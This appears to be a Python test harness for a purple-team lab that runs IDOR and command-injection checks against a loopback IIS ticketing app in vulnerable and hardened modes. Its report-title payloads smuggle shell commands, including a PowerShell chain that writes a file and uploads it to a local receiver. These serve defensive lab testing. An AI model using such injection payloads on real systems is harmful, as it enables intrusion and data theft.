#!/usr/bin/env python3
"""Bounded localhost IIS Purple Lab reproductions. Never a remote scanner.

A uses real HTTP with no process primitive. B/C require an acknowledged disposable
native Windows VM; CI tests their app launch boundary with a mocked launcher.
"""
from __future__ import annotations

import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import hashlib
from http.cookiejar import CookieJar
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
from pathlib import Path
import socket
import threading
from urllib.error import HTTPError
from urllib.parse import urlsplit
from urllib.request import HTTPCookieProcessor, HTTPRedirectHandler, ProxyHandler, Request, build_opener

SYNTHETIC_ARTIFACT = b"IIS Purple Lab synthetic transfer artifact."
B_TITLE = "monthly & whoami & rem "
C_TITLE = (
    "monthly & powershell.exe -NoProfile -NonInteractive -Command "
    '"whoami; $p=Join-Path $env:PURPLELAB_WORK staged-dummy.txt; '
    "[IO.File]::WriteAllText($p,'IIS Purple Lab synthetic transfer artifact.'); "
    "Invoke-WebRequest -UseBasicParsing -Uri http://127.0.0.1:8099/evidence "
    "-Method Post -InFile $p -ContentType application/octet-stream; "
    '(Get-FileHash $p -Algorithm SHA256).Hash" & rem '
)


def utc() -> str:
    return datetime.now(timezone.utc).isoformat()


def validate_base_url(value: str) -> str:
    parsed = urlsplit(value)
    if (parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "::1"}
            or parsed.username or parsed.password or parsed.query or parsed.fragment
            or parsed.path not in {"", "/"} or parsed.port is None):
        raise ValueError("Use an explicit loopback URL such as http://127.0.0.1:5080")
    return value.rstrip("/")


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise ValueError("Lab client refuses redirects to preserve its fixed target boundary")


class Session:
    def __init__(self, base_url: str):
        self.base = validate_base_url(base_url)
        self.opener = build_opener(ProxyHandler({}), NoRedirect(), HTTPCookieProcessor(CookieJar()))

    def request(self, path: str, body: dict | None = None) -> dict:
        data = None if body is None else json.dumps(body).encode()
        request = Request(self.base + path, data=data, headers={
            "Content-Type": "application/json", "X-PurpleLab-Request": "1"})
        started = utc()
        try:
            response = self.opener.open(request, timeout=30)
        except HTTPError as error:
            response = error
        with response:
            raw = response.read(65537)
            if len(raw) > 65536:
                raise ValueError("Lab response exceeds bounded client limit")
            text = raw.decode("utf-8", errors="replace")
            try:
                parsed = json.loads(text)
            except ValueError:
                parsed = text
            return {"started": started, "completed": utc(), "path": path,
                    "status": response.status, "request_id": response.headers.get("X-Request-ID"), "body": parsed}

    def login(self, username: str, password: str) -> None:
        result = self.request("/api/login", {"username": username, "password": password})
        if result["status"] != 200:
            raise RuntimeError(f"Lab login failed for synthetic account {username}: {result['status']}")


class EvidenceSink:
    """Separate harness infrastructure; receipt proves received bytes, not file reads."""
    def __init__(self, directory: Path):
        self.directory = directory
        self.receipts: list[dict] = []
        sink = self

        class Handler(BaseHTTPRequestHandler):
            def setup(self):
                super().setup()
                self.connection.settimeout(3)

            def do_POST(self):
                if self.path != "/evidence" or self.client_address[0] != "127.0.0.1":
                    self.send_error(403)
                    return
                try:
                    size = int(self.headers.get("Content-Length", "-1"))
                except ValueError:
                    size = -1
                if not 0 <= size <= 4096:
                    self.send_error(413)
                    return
                try:
                    body = self.rfile.read(size)
                except (TimeoutError, socket.timeout):
                    self.send_error(408)
                    return
                if len(body) != size:
                    self.send_error(400)
                    return
                digest = hashlib.sha256(body).hexdigest()
                sink.directory.mkdir(parents=True, exist_ok=True)
                artifact = sink.directory / (digest + ".bin")
                artifact.write_bytes(body)
                receipt = {"timestamp": utc(), "source": "controlled_receiver", "sha256": digest,
                           "bytes": len(body), "peer": self.client_address[0], "artifact": artifact.name,
                           "expected_synthetic_content": body == SYNTHETIC_ARTIFACT}
                sink.receipts.append(receipt)
                with (sink.directory / "receipts.jsonl").open("a", encoding="utf-8") as stream:
                    stream.write(json.dumps(receipt) + "\n")
                self.send_response(201)
                self.end_headers()
                self.wfile.write(b"synthetic artifact received")

            def log_message(self, *_args):
                pass

        self.server = HTTPServer(("127.0.0.1", 8099), Handler)
        self.server.timeout = 5
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *_args):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)


def run(args: argparse.Namespace) -> dict:
    password = Path(args.password_file).read_text(encoding="utf-8").strip()
    base = validate_base_url(args.base_url)
    client = Session(base)
    health = client.request("/health")
    if health["status"] != 200 or not isinstance(health["body"], dict) or health["body"].get("mode") != args.mode:
        raise RuntimeError("The lab health/mode does not match --mode")
    families = ["A", "B", "C", "benign"] if args.scenario == "all" else [args.scenario]
    if any(family in {"B", "C"} for family in families) and (os.name != "nt" or not args.disposable_vm):
        raise RuntimeError("B/C are reserved for native Windows with --disposable-vm; do not run on a workstation or shared CI")
    result = {"origin": "actual_http_run", "started": utc(), "base_url": base, "mode": args.mode,
              "health": health, "checks": [], "receiver_receipts": [], "native_telemetry_validated": False}
    client.login("alice", password)

    def check(name: str, response: dict, expected: int, extra_pass: bool = True):
        result["checks"].append({"name": name, "expected_status": expected,
                                 "passed": response["status"] == expected and extra_pass, "response": response})

    if "A" in families:
        status = 200 if args.mode == "vulnerable" else 403
        check("A private cross-tenant ticket", client.request("/api/tickets/2001"), status)
        check("A private attachment", client.request("/api/attachments/1"), status)
        check("A same tenant control", client.request("/api/tickets/1001"), 200)
        check("A legitimate sharing control", client.request("/api/tickets/2002"), 200)
        admin = Session(base); admin.login("admin", password)
        check("A admin policy control", admin.request("/api/tickets/2001"), 200)
    if "B" in families:
        response = client.request("/api/reports", {"ticketId": 1001, "title": B_TITLE})
        identity = health["body"].get("windows_identity", "") or ""
        body = response["body"] if isinstance(response["body"], dict) else {}
        observed = args.mode == "hardened" or (identity and identity.lower() in str(body.get("output", "")).lower())
        check("B same shell interpolation request", response, 200 if args.mode == "vulnerable" else 400, bool(observed))
    if "C" in families:
        with EvidenceSink(Path(args.output).parent / "receiver") as sink:
            response = client.request("/api/reports", {"ticketId": 1001, "title": C_TITLE})
            receipts = sink.receipts.copy()
        result["receiver_receipts"] = receipts
        body = response["body"] if isinstance(response["body"], dict) else {}
        sender_output = str(body.get("output", "")).casefold()
        transferred = (len(receipts) == 1 and receipts[0]["expected_synthetic_content"]
                       and receipts[0]["sha256"].casefold() in sender_output)
        check("C exploit-derived dummy stage and local transfer", response,
              200 if args.mode == "vulnerable" else 400,
              transferred if args.mode == "vulnerable" else not receipts)
        result["receiver_note"] = "Receiver started separately by harness; sender is requested through the B report interpolation primitive. Network events alone do not prove transfer."
    if "benign" in families:
        for i in range(3):
            check(f"benign repeated request {i}", client.request("/api/tickets/1001"), 200)
        check("benign normal report", client.request("/api/reports", {"ticketId": 1001, "title": "Monthly support"}), 200)
        if os.name == "nt" and not getattr(args, "portable_only", False):
            if not args.disposable_vm:
                raise RuntimeError("The native benign helper workload also requires --disposable-vm")
            def helper(index):
                session = Session(base); session.login("alice", password)
                return session.request("/api/reports", {"ticketId": 1001, "title": f"Support export {index}", "helper": True})
            with ThreadPoolExecutor(max_workers=4) as executor:
                for index, response in enumerate(executor.map(helper, range(4))):
                    check(f"benign concurrent helper {index}", response, 200)
        else:
            result["native_helper"] = "not run: portable-only check or native Windows unavailable"
    result["completed"] = utc()
    result["passed"] = all(item["passed"] for item in result["checks"])
    return result


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:5080")
    parser.add_argument("--password-file", required=True)
    parser.add_argument("--scenario", choices=["A", "B", "C", "benign", "all"], required=True)
    parser.add_argument("--mode", choices=["vulnerable", "hardened"], required=True)
    parser.add_argument("--disposable-vm", action="store_true")
    parser.add_argument("--output", required=True)
    args = parser.parse_args()
    try:
        result = run(args)
    except (OSError, ValueError, RuntimeError) as error:
        parser.exit(2, f"Scenario stopped: {error}\n")
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
    print(json.dumps({"passed": result["passed"], "checks": len(result["checks"]), "output": str(output)}))
    return 0 if result["passed"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
